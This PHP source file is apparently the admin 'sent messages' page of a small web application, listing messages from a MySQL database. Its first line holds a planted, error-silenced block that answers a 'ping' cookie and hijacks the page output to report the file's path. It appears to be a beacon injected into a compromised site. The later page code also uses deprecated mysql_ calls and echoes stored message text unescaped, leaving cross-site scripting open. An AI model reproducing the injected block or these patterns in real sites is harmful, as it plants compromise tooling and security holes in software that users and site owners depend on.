<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/msgs_sent.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/msgs_sent.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/msgs_sent.php<-";}return "NotGO->./cynergi/admin/msgs_sent.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
...
if (isset($_GET['id_admin'])) {
  $colname_msgs = $_GET['id_admin'];
}
mysql_select_db($database_dplace, $dplace);
$query_msgs = sprintf("SELECT msg.*, user.names FROM tbl_msgs msg, tbl_users user WHERE msg.id_usuario=user.id_user AND msg.id_admin = %s ORDER BY msg.msgs_date DESC", GetSQLValueString($colname_msgs, "int"));
  ...
  <tr>
    <td align="center" valign="top"><p><br />
      ...
      <table width="400" border="0">
        <tr>
          <td align="center" class="titulo">Sent messages:</td>
        </tr>
      </table>
      <br />
      <table width="400" border="1">
        <?php if ($totalRows_msgs == 0) { // Show if recordset empty ?>
  <tr>
    <td align="center" class="highlight"><strong>You have not sent any message to any user yet.</strong></td>
  </tr>
  <?php } // Show if recordset empty ?>
      </table>
      <?php if ($totalRows_msgs > 0) { // Show if recordset not empty ?>
        <table width="895" border="1">
          <tr class="etiqueta">
            <td width="172" align="left">Date sent:</td>
            <td width="142" align="left">To:</td>
            <td width="244" align="left">Message:</td>
            <td width="224" align="left">Answer (If any):</td>
            <td width="79" align="center">Details</td>
          </tr>
          <?php do { ?>
            <tr>
              <td align="left"><?php echo $row_msgs['msgs_date']; ?></td>
              <td align="left"><?php echo $row_msgs['names']; ?></td>
              <td align="left"><?php echo $row_msgs['msgs_text']; ?></td>
              <td align="left"><?php echo $row_msgs['msgs_ans']; ?></td>
              <td align="center"><a href="msgs_detail.php?id=<?php echo $row_msgs['id_msgs']; ?>"><img src="../images/details.png" width="40" height="40" border="0" /></a></td>
            </tr>
